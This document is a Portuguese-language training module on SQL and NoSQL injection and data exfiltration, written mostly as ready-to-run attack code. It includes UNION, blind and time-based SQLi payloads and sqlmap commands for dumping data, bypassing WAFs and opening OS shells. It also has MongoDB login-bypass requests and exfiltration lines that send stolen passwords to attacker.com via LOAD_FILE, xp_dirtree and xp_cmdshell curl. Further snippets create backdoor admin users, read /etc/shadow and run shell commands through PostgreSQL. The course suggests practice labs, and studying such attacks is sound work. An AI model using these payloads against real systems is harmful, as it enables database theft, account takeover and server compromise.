# Injeção e Exfiltração de Dados

> SQL injection avançado, NoSQL injection, e extração de dados de bancos de dados.

---

## Instalação das Ferramentas

```bash
# sqlmap (SQL injection automatizado)
sudo apt install -y sqlmap

# jSQL Injection
sudo apt install -y jsql

# Burp Suite
# Baixe de https://portswigger.net/burp/communityupdate

# NoSQLMap (NoSQL injection)
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip3 install -r requirements.txt
```

---

## SQL Injection Avançado

### Tipos de SQL Injection

#### 1. In-Band SQLi (Classic)
```bash
# UNION-based
' UNION SELECT 1,2,3,4,5--
' UNION SELECT null,table_name,null FROM information_schema.tables--
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--

# Error-based
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=extractvalue(1,concat(0x7e,(SELECT version())))--
```

#### 2. Blind SQLi
```bash
# Boolean-based
' AND 1=1-- (true)
' AND 1=2-- (false)

# Time-based
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

#### 3. Out-of-Band SQLi
```bash
# MySQL
' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\share'))--

# MSSQL
'; EXEC master..xp_dirtree '\\attacker.com\share'--
```

### SQLMap Avançado

#### Scan Básico
```bash
# Scan completo
sqlmap -u "http://target.com/page?id=1" --batch

# Com数据 de POST
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch

# Com cookies
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch
```

#### Enumeração
```bash
# Listar bancos de dados
sqlmap -u "http://target.com/page?id=1" --dbs

# Listar tabelas
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Listar colunas
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns

# Dump de dados
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

#### Bypass de WAF
```bash
# Usar random user-agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Usar tamper
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# Usar proxy
sqlmap -u "http://target.com/page?id=1" --proxy=http://127.0.0.1:8080

# Delay entre requisições
sqlmap -u "http://target.com/page?id=1" --delay=2
```

#### Output e Scripts
```bash
# Salvar resultados
sqlmap -u "http://target.com/page?id=1" --output-dir=/tmp/sqlmap

# Executar script
sqlmap -u "http://target.com/page?id=1" --sql-file=commands.sql

# Shell interativo
sqlmap -u "http://target.com/page?id=1" --os-shell
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

---

## NoSQL Injection

### MongoDB Injection

#### Autenticação Bypass
```bash
# Bypass de login
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'

# Bypass com $ne
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# Bypass com $regex
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'
```

#### Extração de Dados
```bash
# Extrair dados com $gt
curl -X POST http://target.com/search \
  -H "Content-Type: application/json" \
  -d '{"field": {"$gt": ""}}'

# Extrair dados com $regex
curl -X POST http://target.com/search \
  -H "Content-Type: application/json" \
  -d '{"field": {"$regex": "^admin"}}'

# Extrair dados com $where
curl -X POST http://target.com/search \
  -H "Content-Type: application/json" \
  -d '{"$where": "this.password.length > 0"}'
```

#### NoSQLMap
```bash
# Scan básico
nosqlmap -u http://target.com/api/login -d user=admin -p password

# Extrair dados
nosqlmap -u http://target.com/api/search -d query=test --dump

# Bypass de autenticação
nosqlmap -u http://target.com/api/login -d user=admin -p password --bypass
```

### CouchDB Injection
```bash
# Extrair dados
curl -X GET http://target.com:5984/users/_all_docs

# Extrair dados específicos
curl -X GET http://target.com:5984/users/admin

# Inject via _find
curl -X POST http://target.com:5984/users/_find \
  -H "Content-Type: application/json" \
  -d '{"selector": {"password": {"$gt": ""}}}'
```

---

## Exfiltração de Dados

### Via SQL Injection
```bash
# Extrair dados para arquivo
' UNION SELECT 1,2,3,4 INTO OUTFILE '/tmp/data.txt' FROM users--

# Extrair via LOAD_FILE
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4--

# Extrair via DNS
' AND LOAD_FILE(CONCAT('\\\\',password,'.attacker.com\\share'))--
```

### Via NoSQL Injection
```bash
# Extrair dados via HTTP
curl -X POST http://target.com/api/export \
  -H "Content-Type: application/json" \
  -d '{"query": {"$gt": ""}, "out": "http://attacker.com/collect"}'

# Extrair dados via file
curl -X POST http://target.com/api/backup \
  -H "Content-Type: application/json" \
  -d '{"path": "/tmp/backup.zip"}'
```

### Via Command Injection
```bash
# Se tiver command injection no banco
'; EXEC xp_cmdshell('curl http://attacker.com/steal?data=SELECT * FROM users')--
'; EXEC xp_cmdshell('powershell Invoke-WebRequest -Uri http://attacker.com/steal')--
```

---

## Privilege Escalation

### MySQL
```bash
# Verificar permissões
SELECT user, Super_priv, File_priv, Grant_priv FROM mysql.user;

# Criar novo usuário com privilégios
CREATE USER 'hacker'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' WITH GRANT OPTION;

# Ler arquivos sensíveis
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/var/www/html/config.php');
```

### PostgreSQL
```bash
# Verificar permissões
SELECT has_database_privilege('postgres', 'mydb', 'CREATE');
SELECT has_table_privilege('postgres', 'users', 'SELECT');

# Criar superusuário
ALTER USER postgres WITH SUPERUSER;

# Executar comandos do sistema
CREATE EXTENSION IF NOT EXISTS plpython3u;
CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd, shell=True).decode() $$ LANGUAGE plpython3u;
SELECT exec('id');
```

### MongoDB
```bash
# Verificar roles
db.getRoles({showBuiltinRoles: true})

# Criar usuário administrador
use admin
db.createUser({
  user: "hacker",
  pwd: "password",
  roles: ["root"]
})

# Ler arquivos do sistema
var x = cat('/etc/passwd'); print(x)
```

---

## Lab Prático

### Exercício 1: SQL Injection Advanced
- **Plataforma:** PortSwigger
- **Link:** https://portswigger.net/web-security/sql-injection
- **O que vai praticar:** UNION-based, Blind SQLi, Time-based
- **Tempo estimado:** 90 min

### Exercício 2: NoSQL Injection
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/nosqli
- **O que vai praticar:** MongoDB injection, bypass de autenticação
- **Tempo estimado:** 60 min

### Dica de Estudo
> SQL injection é uma das vulnerabilidades mais perigosas. Sempre teste com sqlmap para automatizar a extração de dados.

---

**Anterior:** [01-enumeracao-e-brute-force.md](01-enumeracao-e-brute-force.md)
**Próximo:** [Módulo 13: Frontend Security](../13-frontend-security/)
